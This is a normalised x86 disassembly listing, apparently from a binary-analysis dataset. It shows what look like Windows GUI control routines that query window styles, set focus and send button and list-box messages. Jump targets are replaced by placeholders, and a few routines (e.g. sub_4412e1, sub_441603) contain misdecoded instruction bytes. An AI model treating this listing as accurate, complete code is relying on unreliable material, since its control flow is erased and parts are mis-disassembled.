jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4507d8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_440878
sub_440df0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_450adc
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403450
push 0xfffffff0
mov eax esi
call sub_4507d8
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_440e28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4518d8
pop esi
pop ebx
retn
sub_440e44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c498
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_440e68
push ebx
mov ebx eax
mov eax ebx
call sub_456604
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_440ea0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_440ef6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_440f04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c4cc
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_440f58
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4512a8
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_440fac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_440fd0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44e1b4
mov eax ebx
mov si 0xffb5
call sub_403450
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4507d8
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403450
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_441048
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43a9dc
mov ebx eax
mov eax ebx
call sub_43aabc
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4507d8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43ac54
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441094
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44ebf4
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4410c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d62c
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_4410f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440f04
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_449774
mov edx 0x19
mov eax esi
call sub_449798
mov dl 0x1
mov eax esi
call sub_450a0c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_441184
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_450adc
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4507d8
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4507d8
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_4411d8
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_450adc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_461dc8
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44b16c
sub_44120c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4410c0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44d558
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_441274
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_44fc1c
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_461cd0
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403450
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4412e1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44135a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_461d58
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44fc24
mov eax ebx
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403450
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441361
sub_441368
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_44fc2c
pop edi
pop esi
pop ebx
retn
sub_4413bc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4413e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43a9dc
mov ebx eax
mov eax ebx
call sub_43aabc
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4507d8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43ac54
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441434
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440f04
mov edx 0x61
mov eax esi
call sub_449774
mov edx 0x11
mov eax esi
call sub_449798
mov dl 0x1
mov eax esi
call sub_450a0c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4414a0
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4414cc
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_441554
retn
mov dl 0x2
call sub_441554
jmp r-xdata
xor edx edx
call sub_441554
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_441554
jmp r-xdata
sub_441554
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_450adc
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403450
sub_4415a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4410c0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44d558
mov eax ebx
mov si 0xffc8
call sub_403450
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_441603
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3eb5173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_44164c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4416da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_461d58
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44fc24
mov eax ebx
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403450
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4416e1
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_4416f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440f04
mov edx 0x71
mov eax esi
call sub_449774
mov edx 0x11
mov eax esi
call sub_449798
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_441760
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4417a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44d494
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_456898
sub_44185c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450a0c
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
push ebp
call sub_4417a0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_449bc4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403450
sub_4418e8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4410c0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44d558
mov eax ebx
mov si 0xffc8
call sub_403450
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_44193f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x41f1173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_441974
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4419e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_461d58
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44fc24
mov eax ebx
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419f0
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_4419f8
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403450
jmp r-xdata
pop esi
retn
sub_441a44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_441b08
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_4507d8
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4436a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045f0
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_41b1f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441b0f
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404464
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_4507d8
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045f0
sub_441b18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_441b9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403450
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4436c8
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441ba2
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41b1f0
sub_441bac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403450
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403450
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403450
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_441c2c
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403450
sub_441c54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_441ce1
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441ce8
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
push 0x0
push 0x180
mov eax edi
call sub_4507d8
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
sub_441cf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_441d7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441d84
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
push edi
push 0x181
mov eax esi
call sub_4507d8
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
sub_441d9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441eec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441ef3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
mov eax [ ebp - 0x4 ]
call sub_41b074
xor eax eax
push ebp
push sub_441eca
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403450
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403450
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403450
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403450
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_441f0c
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4507d8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44a4f4
sub_441f40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_404464
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_4507d8
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_4436f0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441f84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442083
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44208a
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
call sub_41b074
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_442066
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403450
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403450
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403450
sub_442094
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c4cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_449774
mov edx 0x61
mov eax ebx
call sub_449798
mov dl 0x1
mov eax ebx
call sub_450a0c
xor edx edx
mov eax ebx
call sub_44a17c
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_448b94
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
